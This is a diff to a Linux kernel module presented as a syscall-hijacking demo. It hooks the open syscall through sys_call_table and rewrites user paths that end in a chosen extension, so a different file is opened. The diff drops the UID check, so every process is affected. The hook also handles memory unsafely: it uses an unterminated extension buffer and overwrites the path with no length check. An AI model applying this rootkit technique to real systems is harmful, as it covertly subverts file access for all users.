@@ -5,7 +5,6 @@
 #include <linux/kallsyms.h>
 #include <linux/moduleparam.h>
 #include <linux/uaccess.h>
-#include <linux/cred.h>
 #include <asm/cacheflush.h>
 
 #define NO_PROTECTION(X) \
@@ -26,11 +25,8 @@ MODULE_AUTHOR("Adrish Dey <rickdey1998@gmail.com>");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Demo Application for Syscall Hijacking");
 
-static unsigned int uid;
 static void **sys_call_table;
 static char *filename, *target_extension;
-module_param(uid, uint, PERMISSION_OCTAL);
-MODULE_PARM_DESC(uid, " UID of the processes to attack");
 module_param(filename, charp, PERMISSION_OCTAL);
 MODULE_PARM_DESC(filename, " Path to file to open");
 module_param(target_extension, charp, PERMISSION_OCTAL);
@@ -66,12 +62,10 @@ asmlinkage int _hacked__NR_open(const char* path, int flags, mode_t mode){
   char extension[4];
   int length = user_strlen(path);
   copy_from_user(extension, (char*)(path + length - 4), 4);
-  if(current_uid().val == uid){
-    printk(KERN_INFO "Extension: %s\nTarget Extension: %s\n", extension, target_extension);
-    if(!strcasecmp(extension, target_extension)){
+  printk(KERN_INFO "Extension: %s\nTarget Extension: %s\n", extension, target_extension);
+  if(!strcasecmp(extension, target_extension)){
     printk("Target file extension found. Patching");
     copy_to_user((void*)path, filename, strlen(filename) + 1);
-    }
   }
   return original_open(path, flags, mode);
 }
